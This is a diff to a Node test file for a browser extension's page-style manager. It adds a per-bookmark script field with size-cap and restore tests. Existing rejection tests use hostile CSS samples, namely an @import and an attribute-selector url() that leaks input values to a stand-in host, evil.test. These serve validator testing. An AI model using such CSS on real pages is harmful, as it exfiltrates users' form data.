@@ -4,7 +4,9 @@ import test from 'node:test';
 import { PageStyleManager } from '../src/managers/impl/pageStyleManager.ts';
 import { BOOKMARK_PAGE_STYLES_KEY } from '../src/managers/shared/pageStyleApi.ts';
 
-const entry = (css, autoApply, origin, rev) => ({ css, autoApply, origin, rev });
+const entry = (css, autoApply, origin, rev, script = '') => ({ css, autoApply, origin, rev, script });
+
+const SCRIPT = 'agent.on(document, "keydown", (event) => { if (event.key === "]") seekNext(); });';
 
 // A manager over a fake storage area; `local` is the area, `writes` counts storage.set calls
 function createManager({ stored = {}, getError = null } = {})
@@ -72,15 +74,15 @@ test('save refuses CSS that loads remote content and pages that are not http(s),
   await manager.load();
 
   await assert.rejects(
-    manager.save('10', '@import "https://evil.test/x.css";\nvideo { width: 90% !important; }', 'https://videos.test/u/1'),
+    manager.save('10', '@import "https://evil.test/x.css";\nvideo { width: 90% !important; }', '', 'https://videos.test/u/1'),
     /@import is not allowed/
   );
   await assert.rejects(
-    manager.save('10', 'input[value^="a"] { background: url(https://evil.test/leak?a) }', 'https://videos.test/u/1'),
+    manager.save('10', 'input[value^="a"] { background: url(https://evil.test/leak?a) }', '', 'https://videos.test/u/1'),
     /url\(\) with a non-data: URL is not allowed/
   );
   await assert.rejects(
-    manager.save('11', 'body { color: red; }', 'chrome://settings'),
+    manager.save('11', 'body { color: red; }', '', 'chrome://settings'),
     /only http and https pages/
   );
 
@@ -89,9 +91,35 @@ test('save refuses CSS that loads remote content and pages that are not http(s),
   assert.deepEqual(manager.getState().styles, stored);
 });
 
-test('Undo of a delete puts each style back on the new bookmark id unchanged, Auto-apply and rev included', async () =>
+test('a script-only save is stored with empty CSS and Auto-apply on', async () =>
 {
-  const bookmark = entry('video { width: 100% !important; }', false, 'https://videos.test', 'r1');
+  const { manager, local } = createManager();
+  await manager.load();
+
+  await manager.save('10', '', SCRIPT, 'https://videos.test/watch?v=1');
+
+  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], { 10: entry('', true, 'https://videos.test', 'rev-1', SCRIPT) });
+});
+
+test('save refuses empty CSS and script together and a script over the size cap, and keeps the stored value', async () =>
+{
+  const stored = { 10: entry('video { width: 100% !important; }', true, 'https://videos.test', 'r1', SCRIPT) };
+  const { manager, local, counters } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: stored } });
+  await manager.load();
+
+  await assert.rejects(manager.save('10', '  \n', '\n', 'https://videos.test/u/1'), /no CSS or script to save/);
+  await assert.rejects(
+    manager.save('10', 'a {}', 'x'.repeat(64 * 1024 + 1), 'https://videos.test/u/1'),
+    /script is larger than 64 KB/
+  );
+
+  assert.equal(counters.writes, 0);
+  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], stored);
+});
+
+test('Undo of a delete puts each style back on the new bookmark id unchanged, Auto-apply, rev and script included', async () =>
+{
+  const bookmark = entry('video { width: 100% !important; }', false, 'https://videos.test', 'r1', SCRIPT);
   const favorite = entry('main { max-width: none !important; }', true, 'https://docs.test', 'r2');
   const { manager, local } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: { 10: bookmark, 20: favorite } } });
   await manager.load();
@@ -105,7 +133,7 @@ test('Undo of a delete puts each style back on the new bookmark id unchanged, Au
   assert.equal(manager.styles.styleFor('120').appliedId, 'saved-r2');
 });
 
-test('restore refuses a malformed record and CSS that loads remote content, with no write', async () =>
+test('restore refuses a malformed record, CSS that loads remote content and an oversized script, with no write', async () =>
 {
   const { manager, local, counters } = createManager();
   await manager.load();
@@ -115,6 +143,10 @@ test('restore refuses a malformed record and CSS that loads remote content, with
   await assert.rejects(
     manager.restore('110', entry('@import "https://evil.test/x.css";', true, 'https://a.test', 'r1')),
     /@import is not allowed/
+  );
+  await assert.rejects(
+    manager.restore('110', entry('a {}', true, 'https://a.test', 'r1', 'x'.repeat(64 * 1024 + 1))),
+    /script is larger than 64 KB/
   );
 
   assert.equal(counters.writes, 0);
